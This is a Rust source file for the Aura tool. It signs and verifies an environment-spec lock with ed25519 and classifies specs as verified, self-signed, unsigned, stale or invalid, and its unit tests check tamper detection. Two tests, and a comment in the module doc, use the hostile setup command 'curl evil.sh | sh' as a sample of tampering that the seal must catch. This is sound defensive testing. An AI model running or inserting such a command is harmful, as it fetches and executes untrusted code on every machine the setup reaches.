//! The seal: `.aura/env.lock.json`, and the verdict a place acts on.
//!
//! ## Why an environment spec has to be signed
//!
//! Everything else in `.aura/settings.toml` is advice. `[env]` is a list of
//! commands that will run, unattended, as whoever is logged in, on every machine
//! the team touches — the laptop, the box, the crew agent's throwaway worktree,
//! the fresh VM that provisioned itself an hour ago. A one-line edit to
//! `[worktree] setup` is a one-line edit to what executes on all of them.
//!
//! Committing it helps: it is reviewable, and `git log` says who changed it and
//! when. It is not sufficient. A working tree is writable by every tool with a
//! file handle, and the moment a spec is fetched, synced or handed to a machine
//! rather than read out of a reviewed commit, "it was in the repo" stops being a
//! claim anyone checked.
//!
//! So the spec is sealed the way every other sealed thing in Aura is: canonical
//! JCS bytes, ed25519, the same `did:aura:key/…` identity that signs intent
//! blocks, resolved through the same git-tracked `.aura/team/keys.jsonl`. The
//! lock carries the full public key as well as its fingerprint, which lets two
//! different questions be answered separately:
//!
//! * **Is this file intact?** — the signature checks against the embedded key.
//! * **Is the signer one of us?** — the fingerprint appears in the committed
//!   registry.
//!
//! Collapsing those into one boolean would mean a solo developer with no
//! registry could never verify their own spec, and that a valid signature by a
//! stranger would look like a valid signature by a teammate.
//!
//! ## What a place does with the verdict
//!
//! [`TrustState::may_apply`] is the policy, in one place so both the CLI and the
//! app enforce the same one:
//!
//! | Verdict | Apply? | Because |
//! |---|---|---|
//! | [`Verified`](TrustState::Verified) | yes | signed by a key the repo vouches for |
//! | [`SelfSigned`](TrustState::SelfSigned) | yes | intact, signer simply not in the registry yet |
//! | [`Unsigned`](TrustState::Unsigned) | yes | no `[env]` seal exists; this is every project today |
//! | [`Stale`](TrustState::Stale) | **no** | the spec changed after it was signed |
//! | [`Invalid`](TrustState::Invalid) | **no** | the seal does not check out |
//!
//! `Stale` refusing is the load-bearing one. It is what makes editing `[env]`
//! without re-signing a visible act rather than a silent one — and it is exactly
//! the shape an injected `curl … | sh` would arrive in.

use std::path::{Path, PathBuf};

use aura_attestation::{team_keys, SignatureBytes, SigningKey, VerifyingKey};
use base64::{engine::general_purpose::URL_SAFE_NO_PAD as B64URL, Engine};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use crate::spec::{EnvSpec, SPEC_SCHEMA};

/// Committed beside the settings it seals.
pub const LOCK_REL_PATH: &str = ".aura/env.lock.json";
pub const SIG_ALGO: &str = "ed25519";
pub const CANON_TAG: &str = "jcs-rfc8785-v1";

pub fn lock_path(repo_root: &Path) -> PathBuf {
    repo_root.join(".aura").join("env.lock.json")
}

fn registry_path(repo_root: &Path) -> PathBuf {
    repo_root.join(team_keys::registry_path())
}

/// The signature envelope, four fields, same shape the `aura/manifest` seal uses
/// — plus the full public key, because a lock has to be verifiable by someone
/// who has never met the signer.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SigEnvelope {
    pub algo: String,
    /// `did:aura:key/<b64url-first-8>` — the fingerprint the team registry
    /// joins on.
    pub key_id: String,
    /// The full 32-byte ed25519 public key, base64url-no-pad. Same encoding
    /// `.aura/team/keys.jsonl` uses, so the two can be compared byte for byte.
    pub pub_b64: String,
    pub sig_b64: String,
    pub canonicalization: String,
}

/// A spec, sealed. This is the whole of `.aura/env.lock.json`.
///
/// The spec is carried *inside* the lock rather than referenced by digest alone.
/// That is deliberate: it makes the sealed artefact self-contained, so a place
/// can be handed the environment it must reach without also being handed a TOML
/// parser and a checkout — and it makes the diff of a re-signing show what
/// actually changed, in the same commit as the signature that blesses it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SignedSpec {
    pub schema: String,
    /// `sha256:…` of [`SignedSpec::spec`], restated so a reader can compare it
    /// against `.aura/settings.toml` without re-deriving anything.
    pub digest: String,
    pub spec: EnvSpec,
    /// Unix seconds. Inside the signature, so it cannot be back-dated.
    pub signed_at: i64,
    pub signature: SigEnvelope,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum LockError {
    NotFound(String),
    Io(String),
    Malformed(String),
    UnsupportedSchema(String),
    UnsupportedAlgo(String),
    UnsupportedCanon(String),
    BadKey(String),
    KeyIdMismatch { claimed: String, derived: String },
    DigestMismatch { sealed: String, actual: String },
    BadSignature(String),
    Canonicalize(String),
}

impl std::fmt::Display for LockError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            LockError::NotFound(p) => write!(f, "no environment lock at {p}"),
            LockError::Io(e) => write!(f, "{LOCK_REL_PATH}: {e}"),
            LockError::Malformed(e) => write!(f, "{LOCK_REL_PATH} is not a readable lock: {e}"),
            LockError::UnsupportedSchema(s) => write!(
                f,
                "{LOCK_REL_PATH} was written by a newer Aura (schema {s}, this build speaks {SPEC_SCHEMA})"
            ),
            LockError::UnsupportedAlgo(a) => write!(f, "unsupported signature algorithm {a}"),
            LockError::UnsupportedCanon(c) => write!(f, "unsupported canonicalization {c}"),
            LockError::BadKey(e) => write!(f, "public key in the lock is unusable: {e}"),
            LockError::KeyIdMismatch { claimed, derived } => write!(
                f,
                "the lock claims key {claimed} but its public key is {derived}"
            ),
            LockError::DigestMismatch { sealed, actual } => write!(
                f,
                "the sealed spec does not match its own digest (sealed {sealed}, actual {actual})"
            ),
            LockError::BadSignature(e) => write!(f, "signature does not check out: {e}"),
            LockError::Canonicalize(e) => write!(f, "{e}"),
        }
    }
}

impl std::error::Error for LockError {}

/// What a place concluded about the spec it is about to apply.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "state", rename_all = "snake_case")]
pub enum TrustState {
    /// Intact, and signed by a key the repository's own committed registry
    /// vouches for.
    Verified {
        key_id: String,
        /// The registry's name for the signer, when it has one.
        signer: Option<String>,
    },
    /// Intact, but the signing key is not in `.aura/team/keys.jsonl`. Normal for
    /// a solo repo and for the first spec anyone signs; the fix is
    /// `aura keys publish`, not a refusal.
    SelfSigned { key_id: String },
    /// No lock file. Every project that has never declared an `[env]` table.
    Unsigned,
    /// The settings file has changed since it was sealed.
    Stale { sealed: String, actual: String },
    /// There is a lock and it does not check out.
    Invalid { detail: String },
}

impl TrustState {
    /// May a place act on this spec without being told twice?
    pub fn may_apply(&self) -> bool {
        matches!(
            self,
            TrustState::Verified { .. } | TrustState::SelfSigned { .. } | TrustState::Unsigned
        )
    }

    /// One line for a human, in the terms they would act on.
    pub fn describe(&self) -> String {
        match self {
            TrustState::Verified { key_id, signer } => match signer {
                Some(s) => format!("signed by {s} ({key_id})"),
                None => format!("signed by {key_id}, a key this repo vouches for"),
            },
            TrustState::SelfSigned { key_id } => format!(
                "signed by {key_id}, which is not in .aura/team/keys.jsonl — publish it so teammates can verify"
            ),
            TrustState::Unsigned => {
                "not sealed — run `aura env sign` to make this reviewable".into()
            }
            TrustState::Stale { sealed, actual } => format!(
                "{} changed after it was signed (sealed {}, now {}) — review the change and re-sign",
                crate::parse::SETTINGS_REL_PATH,
                short(sealed),
                short(actual)
            ),
            TrustState::Invalid { detail } => format!("seal is broken: {detail}"),
        }
    }
}

fn short(digest: &str) -> String {
    digest.trim_start_matches("sha256:").chars().take(12).collect()
}

/// PURE: the bytes a lock's signature covers.
///
/// Built field by field rather than by serializing [`SignedSpec`], so the signed
/// bytes are pinned to this function and cannot be changed by a rename or a
/// `serde` attribute somewhere else.
fn canonical_bytes(
    schema: &str,
    digest: &str,
    spec: &EnvSpec,
    signed_at: i64,
) -> Result<Vec<u8>, LockError> {
    let spec_value =
        serde_json::to_value(spec).map_err(|e| LockError::Canonicalize(e.to_string()))?;
    let envelope = json!({
        "schema": schema,
        "digest": digest,
        "spec": spec_value,
        "signed_at": signed_at,
        "signature": Value::Null,
    });
    aura_blocks::canonicalize(&envelope).map_err(|e| LockError::Canonicalize(e.to_string()))
}

/// Seal a spec with a signing key.
pub fn sign_spec(
    spec: &EnvSpec,
    key: &SigningKey,
    now_unix: i64,
) -> Result<SignedSpec, LockError> {
    let digest = spec.digest().map_err(LockError::Canonicalize)?;
    let canon = canonical_bytes(SPEC_SCHEMA, &digest, spec, now_unix)?;
    let vk = key.verifying_key();
    Ok(SignedSpec {
        schema: SPEC_SCHEMA.to_string(),
        digest,
        spec: spec.clone(),
        signed_at: now_unix,
        signature: SigEnvelope {
            algo: SIG_ALGO.to_string(),
            key_id: vk.key_id(),
            pub_b64: B64URL.encode(vk.to_bytes()),
            sig_b64: key.sign(&canon).to_b64(),
            canonicalization: CANON_TAG.to_string(),
        },
    })
}

/// Check a lock against itself: schema, digest, key fingerprint and signature.
///
/// Says nothing about whether the signer is anyone in particular — that is
/// [`trust`]'s job, and keeping them apart is what lets a lock be verified by
/// someone with no access to the team registry.
pub fn verify_lock(lock: &SignedSpec) -> Result<VerifyingKey, LockError> {
    if lock.schema != SPEC_SCHEMA {
        return Err(LockError::UnsupportedSchema(lock.schema.clone()));
    }
    if lock.signature.algo != SIG_ALGO {
        return Err(LockError::UnsupportedAlgo(lock.signature.algo.clone()));
    }
    if lock.signature.canonicalization != CANON_TAG {
        return Err(LockError::UnsupportedCanon(
            lock.signature.canonicalization.clone(),
        ));
    }

    let actual = lock.spec.digest().map_err(LockError::Canonicalize)?;
    if actual != lock.digest {
        return Err(LockError::DigestMismatch {
            sealed: lock.digest.clone(),
            actual,
        });
    }

    let raw = B64URL
        .decode(lock.signature.pub_b64.as_bytes())
        .map_err(|e| LockError::BadKey(e.to_string()))?;
    let bytes: [u8; 32] = raw
        .as_slice()
        .try_into()
        .map_err(|_| LockError::BadKey(format!("expected 32 bytes, got {}", raw.len())))?;
    let vk = VerifyingKey::from_bytes(&bytes).map_err(|e| LockError::BadKey(e.to_string()))?;
    if vk.key_id() != lock.signature.key_id {
        return Err(LockError::KeyIdMismatch {
            claimed: lock.signature.key_id.clone(),
            derived: vk.key_id(),
        });
    }

    let sig = SignatureBytes::from_b64(&lock.signature.sig_b64)
        .map_err(|e| LockError::BadSignature(e.to_string()))?;
    let canon = canonical_bytes(&lock.schema, &lock.digest, &lock.spec, lock.signed_at)?;
    vk.verify(&canon, &sig)
        .map_err(|e| LockError::BadSignature(e.to_string()))?;
    Ok(vk)
}

pub fn read_lock(repo_root: &Path) -> Result<SignedSpec, LockError> {
    let path = lock_path(repo_root);
    let text = std::fs::read_to_string(&path).map_err(|e| match e.kind() {
        std::io::ErrorKind::NotFound => LockError::NotFound(path.display().to_string()),
        _ => LockError::Io(e.to_string()),
    })?;
    serde_json::from_str(&text).map_err(|e| LockError::Malformed(e.to_string()))
}

/// Write the lock, pretty and newline-terminated, because it is a file humans
/// read in a pull request.
pub fn write_lock(repo_root: &Path, lock: &SignedSpec) -> Result<PathBuf, LockError> {
    let path = lock_path(repo_root);
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| LockError::Io(e.to_string()))?;
    }
    let mut text =
        serde_json::to_string_pretty(lock).map_err(|e| LockError::Malformed(e.to_string()))?;
    text.push('\n');
    std::fs::write(&path, text).map_err(|e| LockError::Io(e.to_string()))?;
    Ok(path)
}

/// The verdict on the spec a place is about to apply, read off this repo.
///
/// `spec` is what the settings file currently says; the lock is what was sealed.
/// Comparing the two is the whole tamper check, and it is a digest comparison
/// rather than a text one so reformatting, comments and key order are free.
pub fn trust(repo_root: &Path, spec: &EnvSpec) -> TrustState {
    let lock = match read_lock(repo_root) {
        Ok(l) => Some(l),
        Err(LockError::NotFound(_)) => None,
        Err(e) => {
            return TrustState::Invalid {
                detail: e.to_string(),
            }
        }
    };
    verdict(lock.as_ref(), spec, Some(&registry_path(repo_root)))
}

/// PURE: the same verdict, from parts.
///
/// Split out because a spec is not always reached through a checkout on this
/// disk. A box can be asked for its own `.aura/` over the wire, and the lock is
/// self-contained precisely so that it stays verifiable when it arrives that
/// way: [`verify_lock`] needs nothing but the bytes. Only the last question —
/// "is this signer one of us?" — needs a registry, and a caller that has no
/// access to one passes `None` and gets [`TrustState::SelfSigned`], which is
/// the honest answer rather than a downgrade.
pub fn verdict(
    lock: Option<&SignedSpec>,
    spec: &EnvSpec,
    registry: Option<&Path>,
) -> TrustState {
    let Some(lock) = lock else {
        return TrustState::Unsigned;
    };

    let vk = match verify_lock(lock) {
        Ok(vk) => vk,
        Err(e) => {
            return TrustState::Invalid {
                detail: e.to_string(),
            }
        }
    };

    let actual = match spec.digest() {
        Ok(d) => d,
        Err(e) => return TrustState::Invalid { detail: e },
    };
    if actual != lock.digest {
        return TrustState::Stale {
            sealed: lock.digest.clone(),
            actual,
        };
    }

    let key_id = vk.key_id();
    match registry.and_then(|p| team_keys::entry_for(p, &key_id)) {
        Some(entry) => TrustState::Verified {
            key_id,
            signer: entry.display_name.or(entry.email),
        },
        None => TrustState::SelfSigned { key_id },
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parse::parse_spec;

    const DOC: &str = r#"
[env]
version = 2

[env.toolchain]
manager = "mise"
node = "20.11.0"

[[env.package]]
manager = "brew"
name = "ripgrep"

[worktree]
setup = "npm ci"
"#;

    struct Repo(PathBuf);

    impl Repo {
        fn new(tag: &str) -> Self {
            let dir = std::env::temp_dir().join(format!("aura-env-lock-{tag}"));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(dir.join(".aura")).unwrap();
            Repo(dir)
        }
        fn path(&self) -> &Path {
            &self.0
        }
        fn write_settings(&self, text: &str) {
            std::fs::write(crate::parse::settings_path(&self.0), text).unwrap();
        }
    }

    impl Drop for Repo {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn key() -> SigningKey {
        SigningKey::from_seed([7u8; 32])
    }

    #[test]
    fn a_sealed_spec_verifies() {
        let spec = parse_spec(DOC).unwrap();
        let lock = sign_spec(&spec, &key(), 1_700_000_000).unwrap();
        let vk = verify_lock(&lock).unwrap();
        assert_eq!(vk.key_id(), key().verifying_key().key_id());
        assert_eq!(lock.digest, spec.digest().unwrap());
        assert_eq!(lock.schema, SPEC_SCHEMA);
    }

    #[test]
    fn the_seal_covers_the_spec_itself() {
        let spec = parse_spec(DOC).unwrap();
        let mut lock = sign_spec(&spec, &key(), 1).unwrap();
        // Swap the command that runs on every machine, keep the signature.
        lock.spec.lifecycle.setup = Some("curl evil.sh | sh".into());
        let err = verify_lock(&lock).unwrap_err();
        assert!(
            matches!(err, LockError::DigestMismatch { .. }),
            "{err}"
        );
    }

    #[test]
    fn the_seal_covers_the_digest_and_the_timestamp() {
        let spec = parse_spec(DOC).unwrap();

        let mut redigested = sign_spec(&spec, &key(), 1).unwrap();
        redigested.digest = "sha256:00".into();
        assert!(matches!(
            verify_lock(&redigested).unwrap_err(),
            LockError::DigestMismatch { .. }
        ));

        let mut backdated = sign_spec(&spec, &key(), 1).unwrap();
        backdated.signed_at = 0;
        assert!(matches!(
            verify_lock(&backdated).unwrap_err(),
            LockError::BadSignature(_)
        ));
    }

    #[test]
    fn a_swapped_public_key_cannot_re_bless_a_signature() {
        let spec = parse_spec(DOC).unwrap();
        let mut lock = sign_spec(&spec, &key(), 1).unwrap();
        let other = SigningKey::from_seed([9u8; 32]);
        lock.signature.pub_b64 = B64URL.encode(other.verifying_key().to_bytes());
        // The fingerprint no longer derives from the key, and that is caught
        // before the signature is even checked.
        assert!(matches!(
            verify_lock(&lock).unwrap_err(),
            LockError::KeyIdMismatch { .. }
        ));

        // Swapping both is a coherent lock signed by a different key — and the
        // signature still fails, which is the point.
        lock.signature.key_id = other.verifying_key().key_id();
        assert!(matches!(
            verify_lock(&lock).unwrap_err(),
            LockError::BadSignature(_)
        ));
    }

    #[test]
    fn a_future_schema_says_so_rather_than_guessing() {
        let mut lock = sign_spec(&parse_spec(DOC).unwrap(), &key(), 1).unwrap();
        lock.schema = "aura.env/v9".into();
        assert!(matches!(
            verify_lock(&lock).unwrap_err(),
            LockError::UnsupportedSchema(_)
        ));
    }

    #[test]
    fn a_lock_round_trips_through_disk() {
        let repo = Repo::new("roundtrip");
        let spec = parse_spec(DOC).unwrap();
        let lock = sign_spec(&spec, &key(), 42).unwrap();
        write_lock(repo.path(), &lock).unwrap();
        let back = read_lock(repo.path()).unwrap();
        assert_eq!(lock, back);
        verify_lock(&back).unwrap();

        // Readable in a pull request, not one line of JSON.
        let text = std::fs::read_to_string(lock_path(repo.path())).unwrap();
        assert!(text.contains('\n'));
        assert!(text.ends_with('\n'));
    }

    #[test]
    fn no_lock_is_unsigned_and_still_appliable() {
        let repo = Repo::new("unsigned");
        repo.write_settings(DOC);
        let t = trust(repo.path(), &parse_spec(DOC).unwrap());
        assert_eq!(t, TrustState::Unsigned);
        assert!(t.may_apply(), "every project today is in this state");
    }

    #[test]
    fn a_signed_spec_with_no_registry_is_self_signed_and_appliable() {
        let repo = Repo::new("selfsigned");
        repo.write_settings(DOC);
        let spec = parse_spec(DOC).unwrap();
        write_lock(repo.path(), &sign_spec(&spec, &key(), 1).unwrap()).unwrap();
        let t = trust(repo.path(), &spec);
        assert!(matches!(t, TrustState::SelfSigned { .. }), "{t:?}");
        assert!(t.may_apply());
        assert!(t.describe().contains("team/keys.jsonl"));
    }

    #[test]
    fn a_key_the_repo_vouches_for_is_verified_and_named() {
        let repo = Repo::new("verified");
        repo.write_settings(DOC);
        let spec = parse_spec(DOC).unwrap();
        let k = key();
        write_lock(repo.path(), &sign_spec(&spec, &k, 1).unwrap()).unwrap();

        std::fs::create_dir_all(repo.path().join(".aura").join("team")).unwrap();
        team_keys::publish_self(
            &registry_path(repo.path()),
            &k,
            &team_keys::SelfIdentity {
                display_name: Some("Ashiq".into()),
                ..Default::default()
            },
            1,
        )
        .unwrap();

        match trust(repo.path(), &spec) {
            TrustState::Verified { signer, .. } => assert_eq!(signer.as_deref(), Some("Ashiq")),
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn editing_the_settings_after_sealing_is_stale_and_refused() {
        let repo = Repo::new("stale");
        let sealed = parse_spec(DOC).unwrap();
        write_lock(repo.path(), &sign_spec(&sealed, &key(), 1).unwrap()).unwrap();

        // Somebody adds a line. The lock is untouched and still perfectly valid
        // — it just no longer describes what is on disk.
        let edited = parse_spec(&format!("{DOC}\n[[env.package]]\nmanager=\"brew\"\nname=\"curl\"\n"))
            .unwrap();
        let t = trust(repo.path(), &edited);
        assert!(matches!(t, TrustState::Stale { .. }), "{t:?}");
        assert!(!t.may_apply(), "an unreviewed edit must not run on every box");
        assert!(t.describe().contains("re-sign"));
    }

    #[test]
    fn reformatting_the_settings_is_not_a_change() {
        let repo = Repo::new("reformat");
        write_lock(
            repo.path(),
            &sign_spec(&parse_spec(DOC).unwrap(), &key(), 1).unwrap(),
        )
        .unwrap();

        let reformatted = r#"
# a comment somebody added
[worktree]
setup   =   "npm ci"

[env]
version = 2

[[env.package]]
name    = "ripgrep"
manager = "brew"

[env.toolchain]
node    = "20.11.0"
manager = "mise"
"#;
        let t = trust(repo.path(), &parse_spec(reformatted).unwrap());
        assert!(matches!(t, TrustState::SelfSigned { .. }), "{t:?}");
    }

    #[test]
    fn a_corrupt_lock_is_invalid_and_refused() {
        let repo = Repo::new("corrupt");
        std::fs::write(lock_path(repo.path()), "{ not json").unwrap();
        let t = trust(repo.path(), &parse_spec(DOC).unwrap());
        assert!(matches!(t, TrustState::Invalid { .. }), "{t:?}");
        assert!(!t.may_apply());
    }

    #[test]
    fn a_tampered_lock_on_disk_is_invalid_and_refused() {
        let repo = Repo::new("tampered");
        let spec = parse_spec(DOC).unwrap();
        let mut lock = sign_spec(&spec, &key(), 1).unwrap();
        lock.spec.lifecycle.setup = Some("curl evil.sh | sh".into());
        lock.digest = lock.spec.digest().unwrap();
        write_lock(repo.path(), &lock).unwrap();
        // Digest now agrees with the doctored spec, so only the signature
        // catches it.
        let t = trust(repo.path(), &lock.spec);
        assert!(matches!(t, TrustState::Invalid { .. }), "{t:?}");
        assert!(!t.may_apply());
    }

    #[test]
    fn the_verdict_serializes_with_a_tag_the_ui_can_switch_on() {
        let v = serde_json::to_value(TrustState::Stale {
            sealed: "sha256:aa".into(),
            actual: "sha256:bb".into(),
        })
        .unwrap();
        assert_eq!(v["state"], "stale");
        assert_eq!(v["sealed"], "sha256:aa");
    }
}
